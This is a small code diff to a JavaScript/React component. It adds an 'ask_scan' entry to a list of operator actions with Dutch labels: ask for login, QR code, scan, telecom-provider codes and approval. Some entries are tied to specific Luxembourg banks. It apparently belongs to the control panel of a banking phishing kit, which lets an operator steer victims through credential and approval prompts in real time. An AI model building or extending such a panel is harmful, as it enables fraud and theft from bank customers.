@@ -193,7 +193,8 @@ function MiniLogo({ slug, name }) {
 
 const ACTIONS = [
   { key: "ask_login", label: "Login vragen", style: "bg-blue-600 text-white", banks: null },
-  { key: "ask_qr", label: "QR vragen", style: "bg-fuchsia-700 text-white", banks: ["bil", "spuerkeess"] },
+    { key: "ask_qr", label: "QR vragen", style: "bg-fuchsia-700 text-white", banks: ["bil", "spuerkeess"] },
+    { key: "ask_scan", label: "Scan vragen", style: "bg-purple-700 text-white", banks: ["bil", "spuerkeess"] },
   { key: "ask_tango", label: "Tango vragen", style: "bg-slate-700 text-white", banks: null },
   { key: "ask_orange", label: "Orange vragen", style: "bg-orange-500 text-white", banks: null },
   { key: "ask_approve", label: "Goedkeuring vragen", style: "bg-violet-600 text-white", banks: null },
